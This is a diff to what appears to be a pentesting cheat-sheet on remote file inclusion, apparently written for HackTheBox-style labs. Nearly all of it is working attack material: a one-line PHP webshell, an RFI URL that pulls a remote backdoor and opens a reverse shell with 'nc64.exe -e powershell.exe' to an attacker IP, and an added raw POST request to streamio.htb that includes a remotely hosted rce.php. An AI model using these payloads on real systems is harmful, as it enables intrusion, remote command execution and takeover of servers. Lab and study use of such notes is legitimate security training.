@@ -24,6 +24,7 @@ another php webshell example
 ```php
 <?php system ($GET["cmd"]) ?>
 ```
+
 ## Demonstration of RFI Attacks
 
 #### Enumerating
@@ -91,3 +92,31 @@ python3 -m http.server 80
 http://<target>.com/index.php?view=http://<kali_ip>/simple-backdoor.php?cmd=nc64.exe -e powershell.exe 10.10.10.10 9001
 ```
 likewise you may need to url encode (%20 = spaces)
+
+
+Example RFI in a POST request
+```bash
+# Host your malicious code
+python3 -m http.server 80
+
+# The POST Request
+POST /admin/?debug=master.php HTTP/2
+Host: streamio.htb
+Cookie: PHPSESSID=p6m04qvjlok2bbi59t1imsmmsc
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: none
+Sec-Fetch-User: ?1
+Priority: u=0, i
+Te: trailers
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 29
+
+include=http://10.10.14.255/rce.php
+```
